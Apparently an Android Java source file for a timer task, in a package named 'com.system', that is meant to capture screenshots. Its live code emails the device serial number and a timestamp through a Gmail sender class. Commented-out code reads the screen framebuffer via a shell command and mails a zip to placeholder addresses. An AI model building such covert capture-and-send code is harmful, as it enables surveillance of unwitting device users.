package com.system;

import java.io.DataOutputStream;
import java.io.File;
import java.util.Date;
import java.util.TimerTask;

import com.system.utils.*;
import com.system.utils.mail.GMailSenderEx;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for screenshot capture.
 */
class CaptureTask extends TimerTask 
{
	public Service service;
	
	public CaptureTask(Service service)
	{
		super();
		this.service = service;
	}
	
	private final String LOGTAG = "CaptureTask";
	
	public void run() 
	{
		Log.d(LOGTAG, "start to capture screenshot");
		
		//TODO
		String now = (new Date()).toString();
		
		// run shell script to export screenshot
        Process process = null;
        DataOutputStream os = null;
        //String command = "cat /dev/graphics/fb0 > /sdcard/tmp/frame.raw";
        try {
        	//Tools.messageBox(getApplicationContext(), "enter try");
        	/*
        	process = Runtime.getRuntime().exec("adb shell");        	
        	Tools.messageBox(getApplicationContext(), "adb shell ok");
        	os = new DataOutputStream(process.getOutputStream());
        	os.writeBytes(command + "\n");
        	os.writeBytes("exit\n");
            os.flush();*/
            
        	/*
            process = Runtime.getRuntime().exec(command);
            os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("exit\n");
            os.flush();
        	
            Tools.messageBox(getApplicationContext(), "command ok");            
            process.waitFor();*/
            
            //getScreen();
        }
        catch (Exception e) {
            Log.d(SysUtils.TAG_DEBUG, "Unexpected error: " + e.getMessage());
            return;
        }
        finally {
            try {
                if (os != null) {
                    os.close();
                }
                process.destroy();
            } catch (Exception e) {
                // nothing
            }
        }
        
        // Send mail 
        try {   
            GMailSenderEx sender = new GMailSenderEx();
            String subject = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
            String body    = subject;
            sender.setSubject(subject);
            sender.setBody(body);
            sender.send();   
        } catch (Exception e) {   
            Log.e("SendMail", e.getMessage(), e);   
        } 
        
        /*
        Intent sendIntent = new Intent(android.content.Intent.ACTION_SEND);
        String title = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
        sendIntent.putExtra(Intent.EXTRA_SUBJECT, title);
        
        String fileName = Environment.getExternalStorageDirectory().getAbsolutePath() + "/tmp/screen.zip";
        sendIntent.putExtra(Intent.EXTRA_STREAM, Uri.parse("file://" + fileName));
        //sendIntent.setType("text/plain");
        sendIntent.setType("application/zip");
        //sendIntent.setType("image/jpeg");
        
        //Uri uri = Uri.fromFile(new File(Environment.getExternalStorageDirectory(), FILENAME));
        //sendIntent.putExtra(Intent.EXTRA_STREAM, uri);
        
        String content = "\nFrom: " + DeviceProperty.getSerialNum() + "\n" +
        		         "\nTime: " + now + "\n";
        sendIntent.putExtra(Intent.EXTRA_TEXT, content);
        
        String mEmailTo = "foo@gmail.com,bar@gmail.com";
        sendIntent.putExtra(Intent.EXTRA_EMAIL, mEmailTo.split(","));
        sendIntent = Intent.createChooser(sendIntent, this.service.getString(R.string.eMail));
        
        try {
            this.service.startActivity(sendIntent);
        } catch (ActivityNotFoundException ex) {
        	//TODO
        }*/
        
	}
}
